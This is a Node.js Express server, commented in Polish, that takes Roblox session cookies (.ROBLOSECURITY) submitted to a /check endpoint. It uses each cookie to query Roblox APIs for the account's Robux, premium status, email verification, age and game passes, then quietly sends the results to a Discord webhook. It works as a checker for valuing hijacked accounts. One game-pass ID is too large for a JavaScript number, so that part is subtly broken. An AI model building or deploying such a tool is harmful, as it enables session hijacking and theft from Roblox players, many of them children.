const express = require('express');
const app = express();

app.use(express.json());

// CORS żeby frontend mógł wysyłać requesty
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};

  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Złe lub za krótkie cookie' });
  }

  try {
    // CSRF token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Nie udało się pobrać CSRF token – cookie padło?');

    // Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) {
      throw new Error(userRes.status === 401 ? 'Cookie wygasło lub jest błędne' : `Błąd API: ${userRes.status}`);
    }
    const userData = await userRes.json();

    // Verified email (hat 102611803)
    let emailVerified = false;
    try {
      const ownsRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
        {
          method: 'GET',
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json',
          },
        }
      );
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    // Premium
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    // Robux
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // Wiek konta
    let accountAgeDays = 0;
    let created = 'nie udało się pobrać';
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          created = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
        }
      }
    } catch {}

    // Avatar
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // Gamepasy
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}

    const result = {
      success: true,
      username: userData.name,
      displayName: userData.displayName || userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      accountAgeDays,
      created,
      avatarUrl,
      hasGamePasses,
      emailVerified,
    };

    res.json(result);

    // ────────────────────────────────────────────────
    // Wysyłka do Discorda
    // ────────────────────────────────────────────────
    const webhook = process.env.WEBHOOK;
    if (webhook) {
      try {
        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: `Roblox → ${userData.name} (${userData.id})`,
              color: hasPremium ? 0x00ff9d : 0x5865F2,
              thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
              fields: [
                { name: "Nick", value: userData.name, inline: true },
                { name: "Display", value: result.displayName, inline: true },
                { name: "Premium", value: hasPremium ? "Tak" : "Nie", inline: true },
                { name: "Robux", value: robux.toLocaleString(), inline: true },
                { name: "Wiek", value: accountAgeDays + " dni", inline: true },
                { name: "Email zweryfikowany", value: emailVerified ? "Tak" : "Nie", inline: true },
                { name: "Gamepasy", value: hasGamePasses.length.toString(), inline: false },
              ],
              timestamp: new Date().toISOString(),
              footer: { text: "Railway • " + new Date().toLocaleString() }
            }]
          })
        });
      } catch (e) {
        console.error("Webhook nie poleciał:", e.message);
      }
    }

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Błąd serwera' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Działa na porcie ${PORT}`);
});
